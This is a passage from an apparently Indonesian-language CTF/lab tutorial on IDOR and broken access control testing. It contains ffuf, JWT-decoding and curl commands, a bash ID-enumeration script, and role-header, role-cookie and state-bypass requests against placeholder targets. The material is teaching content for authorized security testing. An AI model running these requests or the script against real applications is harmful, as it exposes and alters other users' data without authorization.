```

---

## ffuf Forced Browsing

```bash
# Discover hidden top-level paths.
ffuf \
  -u http://TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,204,301,302,307,401,403
```

Contoh:

```text
# Example output.
admin          [Status: 403, Size: 274]
internal       [Status: 403, Size: 274]
api            [Status: 301, Size: 312]
backup         [Status: 403, Size: 274]
```

Jangan abaikan:

```text
403
401
405
```

karena endpoint tersebut mungkin valid tetapi terlindungi.

---

### 📌 Kapan Digunakan

Forced browsing diprioritaskan ketika:

```text
JS mencantumkan route
API docs tidak lengkap
UI menyembunyikan feature
admin function kemungkinan ada
```

---

# 3.3 🔑 IDOR dalam JWT Claims

JWT sering memiliki payload seperti:

```json
{
  "sub": "100",
  "role": "user"
}
```

atau:

```json
{
  "user_id": 100,
  "role": "user"
}
```

Pertanyaan penting:

```text
Apakah server mempercayai claim tersebut?
```

---

## Decode JWT

JWT berbentuk:

```text
HEADER.PAYLOAD.SIGNATURE
```

Untuk melihat payload secara lokal:

```bash
# Decode a JWT payload without verifying its signature.
python3 - <<'PY'
import base64
import json

token = "HEADER.PAYLOAD.SIGNATURE"

payload = token.split(".")[1]
payload += "=" * (-len(payload) % 4)

print(json.dumps(
    json.loads(base64.urlsafe_b64decode(payload)),
    indent=2
))
PY
```

---

## Apa yang Dicari?

```text
sub
user_id
uid
account_id
role
is_admin
organization_id
```

---

## Jangan Langsung "Edit Role"

JWT signature harus diperiksa server.

Mental model:

```text
JWT
 │
 ├── payload modified
 │
 ▼
signature invalid
 │
 ▼
server should reject
```

Kalau server tetap menerima perubahan tanpa signature valid:

```text
JWT verification failure
```

dan ini mengarah ke masalah authentication/authorization yang lebih serius.

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
Authentication memakai JWT
```

dan claim identitas/role terlihat dalam token.

Cross-reference:

→ [File 28: JWT](/docs/jwt)

---

# 🧰 4 — Automation & Tools

# 4.1 📝 Manual Testing dengan curl

## GET IDOR

```bash
# Read an object using User A's authenticated session.
curl -i \
  -b userA.cookies \
  http://TARGET/api/orders/100
```

---

## GET Manipulated ID

```bash
# Replace the object ID with User B's known lab object.
curl -i \
  -b userA.cookies \
  http://TARGET/api/orders/101
```

---

## POST JSON

```bash
# Test ownership manipulation inside a JSON body.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"user_id":101,"message":"LAB_TEST"}' \
  http://TARGET/api/messages
```

---

## PUT

```bash
# Test modification authorization on another user's object.
curl -i \
  -b userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"title":"LAB_TEST"}' \
  http://TARGET/api/orders/101
```

---

## PATCH

```bash
# Test partial update authorization.
curl -i \
  -b userA.cookies \
  -X PATCH \
  -H 'Content-Type: application/json' \
  -d '{"status":"test"}' \
  http://TARGET/api/orders/101
```

---

## DELETE

```bash
# Test destructive authorization separately in the lab.
curl -i \
  -b userA.cookies \
  -X DELETE \
  http://TARGET/api/orders/101
```

---

## Authorization Header

```bash
# Send a bearer token when the application uses token-based authentication.
curl -i \
  -H 'Authorization: Bearer USER_A_TOKEN' \
  http://TARGET/api/orders/101
```

---

## Save Response

```bash
# Save User A's own object response.
curl -s \
  -b userA.cookies \
  http://TARGET/api/orders/100 \
  -o object_100.json
```

```bash
# Save User B's candidate object response.
curl -s \
  -b userA.cookies \
  http://TARGET/api/orders/101 \
  -o object_101.json
```

---

## Compare

```bash
# Compare both responses for differences.
diff -u object_100.json object_101.json
```

---

### 📌 Kapan Digunakan

`curl` menjadi tool utama ketika ingin:

```text
repeat
compare
automate
change IDs
preserve cookies
```

---

# 4.2 🕵️ Burp Suite untuk IDOR

## 🛠️ Setup Proxy Burp Suite di Parrot OS

1. **Konfigurasi Proxy Browser**:
   - Di Firefox/Parrot OS, arahkan proxy (via FoxyProxy atau Settings) ke `127.0.0.1:8080`.
2. **Install CA Certificate (HTTPS Interception)**:
   - Akses `http://burp` saat Burp berjalan, download `cacert.der`.
   - Import sertifikat ke Firefox -> Settings -> Certificates -> Authorities -> Import -> Centang trust for websites.

---

## 🍪 Capture Cookie Session & Export untuk Script

Untuk menjalankan automation (seperti `idor_test.sh`), simpan cookie session dari request login Burp atau gunakan `curl` untuk export cookie format Netscape:

```bash
# Cara extract cookie dari response Burp / login (via curl)
# Login dan simpan cookie ke file format Netscape
curl -i \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"userA","password":"PasswordA123!"}' \
  -c userA.cookies \
  -b userA.cookies \
  http://TARGET/login

# Cek isi cookie
cat userA.cookies

# Format cookie file ini (Netscape format) siap digunakan oleh idor_test.sh
```

---

## Repeater

Workflow:

```text
HTTP History
    ↓
Right Click
    ↓
Send to Repeater
    ↓
Change ID
    ↓
Send
    ↓
Compare
```

---

## Intruder Numeric IDs

Contoh request:

```http
GET /api/users/§100§ HTTP/1.1
```

Payload type:

```text
Numbers
```

Range:

```text
1–1000
```

Gunakan hanya pada target CTF/lab.

---

## Wordlist ID

Jika IDs bukan integer:

```text
abc123
def456
ghi789
```

gunakan wordlist:

```text
ids.txt
```

---

## Burp Comparer (Analisis Perbedaan Response secara Konkret)

Langkah konkret membandingkan dua response milik user berbeda di Burp Comparer:

1. **Send Response User A & User B ke Comparer**:
   - Request ID 100 (User A) → Right click response → `Send to Comparer`.
   - Request ID 101 (User B) → Right click response → `Send to Comparer`.
2. **Bandingkan Perbedaan**:
   - Buka tab `Comparer`, pilih kedua item response, lalu klik `Words` atau `Bytes`.
3. **Analisis Visual Highlight**:
   - Perhatikan highlight warna (kuning/pink/biru) untuk mengidentifikasi perbedaan HTTP status code, response length, leakage JSON field, atau PII data.

---

## Compare

Perhatikan:

```text
status
length
headers
body
redirect
JSON fields
```

Misalnya:

```text
ID 100 → 403 → 274 bytes
ID 101 → 403 → 274 bytes
ID 102 → 200 → 912 bytes
```

ID `102` menjadi kandidat menarik.

---

## Match & Replace

Gunakan ketika Anda ingin mengubah ID secara konsisten saat mengulang request.

Contoh konsep:

```text
/api/user/100
```

menjadi:

```text
/api/user/101
```

---

### 📌 Kapan Digunakan

Burp paling berguna ketika:

```text
request kompleks
cookies banyak
headers penting
GraphQL
multipart
WebSocket
```

---

# 4.3 🤖 Script `idor_test.sh`

Script ini:

```text
menerima base URL
menerima parameter
menerima start ID
menerima end ID
menguji object ID
membandingkan status
membandingkan response length
flag perbedaan
save result
```

Script tidak melakukan:

```text
DELETE
PUT
PATCH
```

secara otomatis.

Itu sengaja.

GET adalah mode baseline paling aman untuk enumeration.

---

## Script

```bash
#!/usr/bin/env bash

# ============================================================
# idor_test.sh
# Authorized CTF / lab IDOR enumerator
# ============================================================

set -u

usage() {
    cat <<'EOF'
Usage:
  ./idor_test.sh <base_url> <parameter> <start_id> <end_id> [cookie_file]

Example:
  ./idor_test.sh \
    "http://10.10.10.50/api/users" \
    "id" \
    95 \
    110 \
    userA.cookies

Without cookie:
  ./idor_test.sh \
    "http://10.10.10.50/api/users" \
    "id" \
    95 \
    110

Important:
  - GET requests only
  - Authorized lab / CTF targets only
  - Does not modify or delete resources
EOF
    exit 1
}

# ------------------------------------------------------------
# Argument validation
# ------------------------------------------------------------

if [[ $# -lt 4 || $# -gt 5 ]]; then
    usage
fi

# Environment variable options:
# PATH_MODE=true  : Enable URL path mode (e.g., http://TARGET/api/users/123)
# DELAY=1         : Seconds to delay between requests (rate limiting bypass)

PATH_MODE="${PATH_MODE:-false}"
DELAY="${DELAY:-0}"

BASE_URL="$1"
PARAM="$2"
START_ID="$3"
END_ID="$4"
COOKIE_FILE="${5:-}"

# Validate URL.
if [[ "$BASE_URL" != http://* &&
      "$BASE_URL" != https://* ]]; then
    echo "[!] Invalid base URL."
    exit 1
fi

# Validate parameter name (allowed empty if PATH_MODE is true).
if [[ "$PATH_MODE" != "true" ]]; then
    if [[ -z "$PARAM" ||
          ! "$PARAM" =~ ^[A-Za-z0-9_.-]+$ ]]; then
        echo "[!] Invalid parameter name."
        echo "[!] Allowed: A-Z a-z 0-9 _ . -"
        exit 1
    fi
fi

# Validate numeric start ID.
if [[ ! "$START_ID" =~ ^[0-9]+$ ]]; then
    echo "[!] START_ID must be numeric."
    exit 1
fi

# Validate numeric end ID.
if [[ ! "$END_ID" =~ ^[0-9]+$ ]]; then
    echo "[!] END_ID must be numeric."
    exit 1
fi

# Ensure range is sane.
if (( START_ID > END_ID )); then
    echo "[!] START_ID must be <= END_ID."
    exit 1
fi

# Prevent accidental huge scans.
MAX_RANGE=10000

RANGE_SIZE=$((END_ID - START_ID + 1))

if (( RANGE_SIZE > MAX_RANGE )); then
    echo "[!] Range too large."
    echo "[!] Maximum allowed by this script: $MAX_RANGE"
    exit 1
fi

# Validate cookie file if supplied.
if [[ -n "$COOKIE_FILE" ]]; then
    if [[ ! -f "$COOKIE_FILE" ]]; then
        echo "[!] Cookie file does not exist."
        exit 1
    fi

    if [[ ! -r "$COOKIE_FILE" ]]; then
        echo "[!] Cookie file is not readable."
        exit 1
    fi
fi

# Validate dependencies.
if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is required."
    exit 1
fi

if ! command -v awk >/dev/null 2>&1; then
    echo "[!] awk is required."
    exit 1
fi

# ------------------------------------------------------------
# Output directory
# ------------------------------------------------------------

OUTPUT_DIR="idor_results"

if ! mkdir -p "$OUTPUT_DIR"; then
    echo "[!] Unable to create output directory."
    exit 1
fi

TIMESTAMP="$(date +%Y%m%d_%H%M%S)"

RESULT_FILE="$OUTPUT_DIR/idor_${TIMESTAMP}.tsv"

# ------------------------------------------------------------
# Baseline ID
# ------------------------------------------------------------

if [[ "$PATH_MODE" == "true" ]]; then
    BASELINE_URL="${BASE_URL}/${START_ID}"
else
    BASELINE_URL="${BASE_URL}?${PARAM}=${START_ID}"
fi

echo "============================================================"
echo " IDOR GET Enumerator"
echo "============================================================"
echo "[!] AUTHORIZED CTF / LAB ONLY"
echo "[*] Base URL : $BASE_URL"
echo "[*] Parameter: $PARAM"
echo "[*] Range    : $START_ID-$END_ID"
echo "[*] Cookie   : ${COOKIE_FILE:-none}"
echo
echo "[*] Baseline URL:"
echo "    $BASELINE_URL"
echo

# ------------------------------------------------------------
# Request baseline
# ------------------------------------------------------------

CURL_BASE_ARGS=(
    -sS
    --max-time 15
)

if [[ -n "$COOKIE_FILE" ]]; then
    CURL_BASE_ARGS+=(-b "$COOKIE_FILE")
fi

BASELINE_META="$(
    curl \
        "${CURL_BASE_ARGS[@]}" \
        -o /tmp/idor_baseline_body.$$ \
        -w '%{http_code}\t%{size_download}' \
        "$BASELINE_URL"
)"

CURL_EXIT=$?

if [[ $CURL_EXIT -ne 0 ]]; then
    echo "[!] Baseline request failed."
    exit 1
fi

BASELINE_STATUS="${BASELINE_META%%$'\t'*}"
BASELINE_LENGTH="${BASELINE_META##*$'\t'}"

echo "[+] Baseline status : $BASELINE_STATUS"
echo "[+] Baseline length : $BASELINE_LENGTH"
echo

# ------------------------------------------------------------
# Initialize result file
# ------------------------------------------------------------

printf 'ID\tSTATUS\tLENGTH\tFLAG\tURL\n' > "$RESULT_FILE"

# ------------------------------------------------------------
# Loop
# ------------------------------------------------------------

for (( ID=START_ID; ID<=END_ID; ID++ )); do

    if [[ "$DELAY" -gt 0 ]] 2>/dev/null; then
        sleep "$DELAY"
    fi

    if [[ "$PATH_MODE" == "true" ]]; then
        TARGET_URL="${BASE_URL}/${ID}"
    else
        TARGET_URL="${BASE_URL}?${PARAM}=${ID}"
    fi

    META="$(
        curl \
            "${CURL_BASE_ARGS[@]}" \
            -o /tmp/idor_body.$$ \
            -w '%{http_code}\t%{size_download}' \
            "$TARGET_URL" \
            2>/dev/null
    )"

    CURL_EXIT=$?

    if [[ $CURL_EXIT -ne 0 ]]; then
        STATUS="ERROR"
        LENGTH="0"
        FLAG="REQUEST_ERROR"
    else
        STATUS="${META%%$'\t'*}"
        LENGTH="${META##*$'\t'}"

        FLAG="NORMAL"

        # Flag status difference.
        if [[ "$STATUS" != "$BASELINE_STATUS" ]]; then
            FLAG="DIFFERENT_STATUS"
        fi

        # Flag significant body length difference.
        if [[ "$LENGTH" != "$BASELINE_LENGTH" ]]; then
            FLAG="${FLAG},DIFFERENT_LENGTH"
        fi
    fi

    printf '%s\t%s\t%s\t%s\t%s\n' \
        "$ID" \
        "$STATUS" \
        "$LENGTH" \
        "$FLAG" \
        "$TARGET_URL" \
        >> "$RESULT_FILE"

    if [[ "$FLAG" != "NORMAL" ]]; then
        echo "[!] ID=$ID STATUS=$STATUS LENGTH=$LENGTH FLAG=$FLAG"
    else
        echo "[.] ID=$ID STATUS=$STATUS LENGTH=$LENGTH"
    fi

done

# ------------------------------------------------------------
# Cleanup temporary files
# ------------------------------------------------------------

rm -f /tmp/idor_baseline_body.$$
rm -f /tmp/idor_body.$$

echo
echo "============================================================"
echo " Summary"
echo "============================================================"

TOTAL="$(tail -n +2 "$RESULT_FILE" | wc -l)"

DIFF="$(tail -n +2 "$RESULT_FILE" | awk -F'\t' '$4 != "NORMAL" {count++} END {print count+0}')"

echo "[+] Total requests : $TOTAL"
echo "[+] Different      : $DIFF"
echo "[+] Results saved  : $RESULT_FILE"
echo
echo "[!] A difference is a candidate, NOT proof of IDOR."
echo "[!] Verify candidate objects manually with ownership context."
echo
```

---

## Permission

```bash
# Make the IDOR tester executable.
chmod +x idor_test.sh
```

---

## Run

```bash
# Enumerate a small numeric range against an authorized lab.
./idor_test.sh \
  "http://10.10.10.50/api/users" \
  "id" \
  95 \
  110 \
  userA.cookies

# Usage dengan Path Mode (/api/users/100):
PATH_MODE=true ./idor_test.sh "http://10.10.10.50/api/users" "" 95 110 userA.cookies

# Usage dengan Rate Limiting Delay (delay 1 detik):
DELAY=1 ./idor_test.sh "http://10.10.10.50/api/users" "id" 95 110 userA.cookies
```

---

## Contoh Output Realistis

```text
============================================================
 IDOR GET Enumerator
============================================================
[!] AUTHORIZED CTF / LAB ONLY
[*] Base URL : http://10.10.10.50/api/users
[*] Parameter: id
[*] Range    : 95-110
[*] Cookie   : userA.cookies

[*] Baseline URL:
    http://10.10.10.50/api/users?id=95

[+] Baseline status : 404
[+] Baseline length : 32

[.] ID=95 STATUS=404 LENGTH=32
[.] ID=96 STATUS=404 LENGTH=32
[.] ID=97 STATUS=404 LENGTH=32
[!] ID=100 STATUS=200 LENGTH=214 FLAG=DIFFERENT_STATUS,DIFFERENT_LENGTH
[!] ID=101 STATUS=200 LENGTH=219 FLAG=DIFFERENT_STATUS,DIFFERENT_LENGTH
[.] ID=102 STATUS=404 LENGTH=32
[.] ID=103 STATUS=404 LENGTH=32
[.] ID=104 STATUS=404 LENGTH=32

============================================================
 Summary
============================================================
[+] Total requests : 16
[+] Different      : 2
[+] Results saved  : idor_results/idor_20260907_132500.tsv

[!] A difference is a candidate, NOT proof of IDOR.
[!] Verify candidate objects manually with ownership context.
```

### 📌 Kapan Digunakan

Gunakan automation ketika:

```text
object ID numeric
range kecil/terkontrol
baseline diketahui
GET endpoint
```

---

# 🔒 5 — Access Control Misconfiguration

# 5.1 🚨 Missing Function Level Access Control

Ini adalah BAC penting yang sering disalahartikan sebagai IDOR.

Contoh:

```text
GET /dashboard
```

aman.

Tetapi:

```text
GET /admin/users
```

tidak punya authorization check.

---

## Test

```bash
# Access an admin endpoint using an ordinary user session.
curl -i \
  -b userA.cookies \
  http://TARGET/admin/users
```

---

## Admin Delete Endpoint

Dalam lab:

```bash
# Test whether a normal user can reach an admin delete function.
curl -i \
  -b userA.cookies \
  -X DELETE \
  http://TARGET/admin/users/101
```

Gunakan hanya terhadap object dummy yang dibuat khusus untuk challenge.

---

## API Admin

```bash
# Test a namespaced administrative API endpoint.
curl -i \
  -b userA.cookies \
  http://TARGET/api/admin/users
```

---

### 📌 Kapan Digunakan

Cari:

```text
/admin/*
/api/admin/*
/manage/*
/internal/*
```

terutama jika route ditemukan dari JS.

---

# 5.2 🎭 Role Manipulation

## JSON Role

```bash
# Test whether the server trusts a client-supplied role field.
curl -i \
  -b userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' \
  http://TARGET/api/profile
```

---

## Header

```bash
# Test whether an application incorrectly trusts an X-Role header.
curl -i \
  -b userA.cookies \
  -H 'X-Role: admin' \
  http://TARGET/api/admin/users
```

---

## Cookie

```bash
# Test a role cookie only when the application visibly uses such a cookie.
curl -i \
  -b 'session=USER_A_SESSION; role=admin' \
  http://TARGET/api/admin/users
```

---

## What to Look For

```text
HTTP 200 instead of 403
additional fields
admin dashboard
admin-only actions
role reflected after refresh
```

### 📌 Kapan Digunakan

Gunakan ketika role tampak berasal dari:

```text
request body
header
cookie
client-side state
```

---

# 5.3 🔀 API Versioning Issues

API versioning kadang menghasilkan authorization inconsistency.

Contoh:

```text
/api/v2/users/123 → 403
/api/v1/users/123 → 200
/api/mobile/users/123 → 200
```

---

## Discover Versions

```bash
# Search JavaScript for versioned API paths.
grep -Eo \
  '/api/(v[0-9]+|mobile|legacy)/[^"'\'' ]+' \
  app.js | sort -u
```

---

## Test v2

```bash
# Test the current API version with the ordinary user's session.
curl -i \
  -b userA.cookies \
  http://TARGET/api/v2/users/101
```

---

## Test v1

```bash
# Compare the older API version under the same session.
curl -i \
  -b userA.cookies \
  http://TARGET/api/v1/users/101
```

---

## Test Mobile

```bash
# Test a mobile-specific API route if discovered.
curl -i \
  -b userA.cookies \
  http://TARGET/api/mobile/users/101
```

---

### 📌 Kapan Digunakan

Prioritaskan ketika menemukan:

```text
v1
v2
legacy
mobile
beta
internal
```

---

# 5.4 🔄 State Machine Bypass

Access control juga dapat gagal karena aplikasi mengharuskan langkah tertentu.

Model:

```text
STEP 1
  ↓
STEP 2
  ↓
STEP 3
  ↓
STEP 4
```

Tetapi attacker mengirim:

```text
STEP 1
  ↓
STEP 4
```

---

## Order Process

Misalnya:

```text
POST /order/create
POST /order/payment
POST /order/confirm
```

Uji apakah confirm dapat dipanggil tanpa payment.

```bash
# Attempt to reach the final order state directly in an authorized lab.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"order_id":100}' \
  http://TARGET/api/order/confirm
```

---

## Payment State

```bash
# Inspect the current state before testing a state transition.
curl -i \
  -b userA.cookies \
  http://TARGET/api/orders/100
```

Misalnya:

```json
{
  "id":100,
  "state":"pending"
}
```

Kemudian test illegal transition:

```bash
# Test whether the application accepts an unexpected state transition.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"order_id":100,"state":"completed"}' \
  http://TARGET/api/order/state
```

---

### 📌 Kapan Digunakan

Gunakan ketika challenge memiliki:

```text
workflow
approval
payment
verification
status
multi-step process
```

---

# 🌳 6 — Decision Tree

```text
                       ┌───────────────────────┐
                       │ Object reference found│
                       └───────────┬───────────┘
                                   │
                                   ▼
                        ┌──────────────────────┐
                        │ What is the reference?│
                        │ ID / UUID / slug /   │
                        │ filename / token     │
                        └──────────┬───────────┘
                                   │
                                   ▼
                       ┌─────────────────────────┐
                       │ Does current user own   │
                       │ the object?             │
                       └───────────┬─────────────┘
                                   │
                         ┌─────────┴─────────┐
                         │                   │
                         ▼                   ▼
                       YES                  NO
                         │                   │
                         ▼                   ▼
                Baseline request       Change reference
                                             │
                                             ▼
                                  ┌────────────────────┐
                                  │ Different object  │
                                  │ returned?         │
                                  └─────────┬──────────┘
                                            │
                                      ┌─────┴─────┐
                                      │           │
                                      ▼           ▼
                                     YES         NO
                                      │           │
                                      ▼           ▼
                                   IDOR       Investigate
                                      │
                                      ▼
                           ┌────────────────────┐
                           │ Horizontal or      │
                           │ Vertical?          │
                           └─────────┬──────────┘
                                     │
                         ┌───────────┴───────────┐
                         │                       │
                         ▼                       ▼
                    Same role                Higher role
                    Horizontal              Vertical
                         │                       │
                         └──────────┬────────────┘
                                    │
                                    ▼
                           Prove authorization
                                    │
                                    ▼
                           ┌───────────────────┐
                           │ What surface?     │
                           └─────────┬─────────┘
                                     │
         ┌───────────────────────────┼────────────────────────┐
         │                           │                        │
         ▼                           ▼                        ▼
    File Download                  REST                     GraphQL
         │                           │                        │
   Change file ID             GET/POST/PUT             Modify query ID
         │                     PATCH/DELETE                  │
         │                           │                        │
         └───────────────────────────┼────────────────────────┘
                                     │
                                     ▼
                           ┌────────────────────┐
                           │ Filter / 403 ?     │
                           └─────────┬──────────┘
                                     │
                           ┌─────────┴──────────┐
                           │                    │
                           ▼                    ▼
                          YES                  NO
                           │                    │
                           ▼                    ▼
                       Test method          Confirm IDOR
                       /header/path
                       /encoding
                           │
                           ▼
                      Parser discrepancy?
                           │
                       ┌───┴───┐
                       │       │
                      YES      NO
                       │       │
                       ▼       ▼
                    Bypass   Stop / rethink
```

---

## Special Branches

```text
FORM FIELD HIDDEN
       │
       ▼
Mass Assignment?
       │
       ├── yes → add role/user_id/is_admin
       │
       └── no  → continue object testing


403 ON ENDPOINT
       │
       ▼
Same endpoint, different method?
       │
       ├── yes → GET/POST/PUT/PATCH/DELETE
       │
       └── no  → headers/path/encoding if justified


ADMIN ENDPOINT FOUND
       │
       ▼
User token
       │
       ├── 200 → Missing Function Level Access Control
       └── 403 → continue endpoint discovery


FILE DOWNLOAD FOUND
       │
       ▼
Change file reference
       │
       ├── 200 / private file → IDOR candidate
       └── 403/404 → analyze ownership logic


GRAPHQL FOUND
       │
       ▼
Find object argument
       │
       ▼
Change ID
       │
       ├── object of another user → GraphQL IDOR
       └── blocked → inspect authorization
```

---

# 🧯 7 — Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Semua variasi menghasilkan 403|Authorization benar-benar enforced|Cari object lain / endpoint lain|
|404 Not Found|Resource memang tidak ada|Pastikan ID valid dengan account kedua|
|404 tetapi resource ada|App memakai 404 untuk hide unauthorized object|Bandingkan dengan known-valid cross-account object|
|Response sama tetapi redirect berbeda|Authorization mungkin terjadi di redirect layer|Follow redirect dan bandingkan final response|
|Response length berbeda tetapi status sama|Perbedaan metadata/template|Inspect body, bukan length saja|
|Rate limiting|Terlalu banyak request|Kecilkan range dan gunakan delay (misal: `DELAY=1 ./idor_test.sh ...`)|
|CSRF protection memblok POST|Token CSRF wajib|Capture token dari browser/Burp|
|Session expiry|Cookie/token kedaluwarsa|Login ulang dan capture session baru|
|UUID benar-benar random|Tidak guessable|Cari UUID leak di endpoint lain|
|Server return generic error|Authorization sengaja disamarkan|Gunakan dua account untuk baseline|
|Object ID valid tapi data kosong|Field disembunyikan|Bandingkan HTTP status/headers dan owned object|
|Admin endpoint 403|Role check bekerja|Cari endpoint/function lain|
|GET aman tapi PATCH vulnerable|Method-specific authorization bug|Test semua methods|
|DELETE tidak bisa|Destructive permission benar|Uji read/update primitive secara terpisah|
|Duplicate parameter diabaikan|Parser memilih satu nilai|Test parser behavior hanya jika relevan|
|`user_id[]=...` mendapat 400|Backend mengharapkan scalar|Jangan memaksakan array technique|
|Header bypass tidak bekerja|Proxy tidak mempercayai header|Jangan anggap header universal|
|`X-Forwarded-For` tidak bekerja|Application tidak memakai IP trust|Cari evidence source code/proxy config|
|Case manipulation gagal|Routing case-sensitive/normalized|Bandingkan canonical route|
|URL encoding gagal|Proxy/application normalizes path|Cari parser discrepancy|
|Double encoding gagal|Multiple normalization layers tidak ada|Stop jika tidak ada evidence|
|ffuf menemukan banyak 403|Endpoint ada tetapi protected|Prioritaskan route yang relevan, bukan bypass membabi buta|
|JS tidak menunjukkan endpoint|Bundle minified/dynamic|Search strings, source maps, runtime Network tab|
|GraphQL introspection disabled|Introspection sengaja dimatikan|Gunakan fields dari frontend/request history|
|GraphQL IDOR tidak terlihat|Resolver authorization mungkin benar|Test mutation/other object fields|
|File filename random|Reference bukan predictable filename|Cari file ID dari response/API|
|Base64 ID tidak berurutan|Encoding bukan security boundary|Cari ID source/other leak|
|MD5 ID tidak predictable|Input source belum diketahui|Cari pola generation|
|API v1 dan v2 sama-sama 403|Authorization konsisten|Cari mobile/internal/legacy route|
|Role field ignored|Allowlist/DTO digunakan|Cari field authorization lain|
|Role berubah di response tetapi tidak privilege|Field hanya reflection|Tes privileged endpoint setelah re-auth/session refresh|
|State bypass gagal|Server memvalidasi transition graph|Map state machine secara lengkap|

---

# 🏆 8 — Golden Rules

## Rule 1 — IDOR Bukan Sekadar "Ganti ID"

```text
ID reference
    ↓
object lookup
    ↓
ownership authorization
```

Yang diuji adalah **authorization**, bukan kemampuan menebak angka.

---

## Rule 2 — IDOR adalah Subset dari BAC

```text
Broken Access Control
       │
       ├── IDOR
       ├── Forced Browsing
       ├── Vertical escalation
       ├── Missing function authorization
       ├── Role manipulation
       └── State-machine bypass
```

---

## Rule 3 — Selalu Gunakan Dua Account

Untuk horizontal testing:

```text
User A
+
User B
```

Ini jauh lebih kuat daripada:

```text
ID 1
ID 2
```

sendirian.

Karena Anda tahu:

```text
object #100 = A
object #101 = B
```

---

## Rule 4 — Establish Baseline

Pertama:

```text
GET own object
```

Kemudian:

```text
GET other object
```

Bandingkan:

```text
status
body
length
headers
redirect
```

---

## Rule 5 — IDOR Bisa Terjadi Tanpa Numeric ID

Perhatikan:

```text
UUID
hash
base64
hex
slug
filename
email
username
opaque token
```

---

## Rule 6 — UUID Bukan Authorization

```text
UUID sulit ditebak
      ≠
UUID aman
```

Kalau UUID bocor dan server tidak check ownership:

```text
IDOR tetap terjadi.
```

---

## Rule 7 — Test Semua HTTP Methods

Minimal:

```text
GET
POST
PUT
PATCH
DELETE
```

Authorization yang benar pada GET tidak menjamin PUT aman.

---

## Rule 8 — Jangan Menyamakan Status 403 dan 404

Keduanya bisa berarti:

```text
forbidden
object hidden
resource missing
```

Gunakan known-valid second account untuk membedakan.

---

## Rule 9 — Response Difference Adalah Candidate

```text
Different length
        ≠
IDOR confirmed
```

Confirm dengan:

```text
object identity
ownership
sensitive field
authorization state
```

---

## Rule 10 — Jangan Percaya Client-Controlled Role

Field:

```text
role=admin
is_admin=true
```

harus dianggap:

```text
untrusted
```

sampai server-side authorization membuktikan sebaliknya.

---

## Rule 11 — Jangan Langsung Fuzz 1–1,000,000

Cari:

```text
known IDs
neighbors
response clues
two accounts
```

baru automation.

---

## Rule 12 — GET Dulu Sebelum Destructive Method

Urutan:

```text
GET
 ↓
prove read IDOR
 ↓
PUT/PATCH
 ↓
DELETE
```

Ini mengurangi risiko merusak state lab.

---

## Rule 13 — 403 Bukan Akhir

Kalau 403:

```text
method
headers
path
encoding
version
endpoint alternative
```

dapat menjadi branch berikutnya.

Tetapi bypass harus berdasarkan evidence, bukan daftar payload acak.

---

## Rule 14 — JS Adalah Peta Attack Surface

Frontend sering mengungkap:

```text
/API routes
admin endpoints
object IDs
GraphQL queries
role checks
hidden functions
```

Jadi:

```text
View Source
+
DevTools
+
JS search
```

merupakan bagian penting dari IDOR recon.

---

## Rule 15 — Bukti Terbaik Adalah Ownership Violation

Contoh terkuat:

```text
User A authenticated
       ↓
requests object owned by B
       ↓
server returns B's private data
```

Itu jauh lebih kuat daripada:

```text
"ID bisa diganti."
```

---

## Rule 16 — Don't Confuse Authentication with Authorization

```text
Authentication:
"Siapa kamu?"

Authorization:
"Apa yang boleh kamu akses?"
```

IDOR biasanya berada di kegagalan authorization.

---

# ✅ 9 — Final Checklist

```text
[ ] Aplikasi memiliki object reference
[ ] Object reference ditemukan
[ ] Parameter ID dicatat
[ ] Own object ditemukan
[ ] Second account dibuat
[ ] Second account object ditemukan
[ ] Current session dicatat
[ ] Baseline request disimpan
[ ] Baseline response disimpan
[ ] Numeric ID diuji
[ ] UUID diuji jika relevan
[ ] Hash ID diuji jika relevan
[ ] Base64 ID diuji jika relevan
[ ] Hex ID diuji jika relevan
[ ] Username reference diuji
[ ] Email reference diuji
[ ] Slug/reference diuji
[ ] File reference diuji
[ ] Query parameter diuji
[ ] Path parameter diuji
[ ] JSON body diuji
[ ] Form body diuji
[ ] Header-controlled identifier diperiksa
[ ] Cookie-controlled identifier diperiksa
[ ] GET diuji
[ ] POST diuji
[ ] PUT diuji
[ ] PATCH diuji
[ ] DELETE diuji
[ ] Horizontal access diuji
[ ] Vertical access diuji
[ ] Admin endpoint dicari
[ ] Hidden endpoint dicari
[ ] JS bundle diperiksa
[ ] DevTools Network diperiksa
[ ] GraphQL diperiksa bila ada
[ ] WebSocket object references diperiksa bila ada
[ ] File download diuji
[ ] PDF/export diuji
[ ] Email/notification object reference diperiksa
[ ] Mass assignment diperiksa
[ ] Duplicate parameter behavior diperiksa
[ ] 403 behavior dicatat
[ ] 404 behavior dicatat
[ ] Redirect behavior dicatat
[ ] Rate limit diperhatikan
[ ] CSRF token diperhatikan
[ ] Session expiry diperhatikan
[ ] API versioning diperiksa
[ ] State-machine workflow diperiksa
[ ] Candidate response diverifikasi manual
[ ] Ownership violation dibuktikan
[ ] Impact dicatat
[ ] Request/response evidence disimpan
```

---

# 🧠 10 — Cross-Workflow Mental Model

IDOR sangat sering menjadi **chain**, bukan vulnerability tunggal.

```text
                    WEB APPLICATION
                           │
                           ▼
                  Authentication
                           │
                           ▼
                  Object Reference
                           │
             ┌─────────────┼─────────────┐
             │             │             │
             ▼             ▼             ▼
            IDOR        Forced Browse  Mass Assignment
             │             │             │
             ▼             ▼             ▼
     Other User Data   Admin Function  Role Escalation
             │             │             │
             └─────────────┼─────────────┘
                           ▼
                    Access Control
                           │
                           ▼
                 Sensitive Function
                           │
             ┌─────────────┼──────────────┐
             │             │              │
             ▼             ▼              ▼
           Files          API           Admin
             │             │              │
             ▼             ▼              ▼
        File Upload      SSRF        Command Injection
             │             │              │
             ▼             ▼              ▼
           LFI/RFI       Internal       RCE
             │             │              │
             └─────────────┼──────────────┘
                           ▼
                    Privilege Escalation
```

---

